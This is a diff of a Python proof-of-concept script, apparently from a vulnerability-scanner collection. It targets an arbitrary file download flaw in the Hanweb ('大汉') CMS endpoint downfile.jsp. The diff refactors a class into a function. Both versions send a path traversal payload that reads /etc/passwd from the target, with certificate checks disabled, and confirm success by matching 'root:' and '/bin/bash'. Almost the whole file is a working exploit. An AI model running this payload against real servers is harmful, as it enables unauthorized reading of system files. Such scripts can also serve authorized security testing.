@@ -9,20 +9,13 @@ description: 文件/vc/vc/columncount/downfile.jsp中,参数filename存在任意
 import sys
 import requests
 import warnings
-  
-
-
-class downfile_filedownload:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['大汉downfile.jsp 任意文件下载','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
@@ -37,5 +30,4 @@ class downfile_filedownload:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = downfile_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
